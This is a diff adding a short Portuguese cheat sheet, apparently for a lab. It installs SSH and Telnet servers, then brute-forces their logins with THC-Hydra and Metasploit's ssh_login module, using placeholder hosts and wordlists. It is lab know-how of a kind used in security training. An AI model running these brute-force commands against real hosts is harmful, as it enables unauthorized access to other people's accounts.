@@ -1,0 +1,49 @@
+Instalando SSH:
+
+# apt-get install openssh-server
+ 
+
+Editando SSH server:
+
+# nano /etc/ssh/sshd_config
+ 
+
+Reiniciando o SSH Server:
+
+# service ssh restart
+ 
+
+Fazendo brute-force com THC-Hydra:
+
+# hydra <IP/Host> -l <login> -P <wordlist> ssh -V
+ 
+
+Entrando no Metasploit Framework:
+
+# msfconsole
+ 
+
+Selecionando exploit:
+
+use auxiliary/scanner/ssh/ssh_login
+ 
+
+Instalando servidor Telnet:
+
+# apt-get install telnetd
+# apt-get install xinetd
+ 
+
+Criando usuário Linux:
+
+# adduser <usuario>
+ 
+
+Iniciando servidor Telnet:
+
+# service xinetd start
+ 
+
+Efetuando ataque brute-force Telnet:
+
+# hydra <IP/Host> -l <login> -P <wordlist> telnet -V
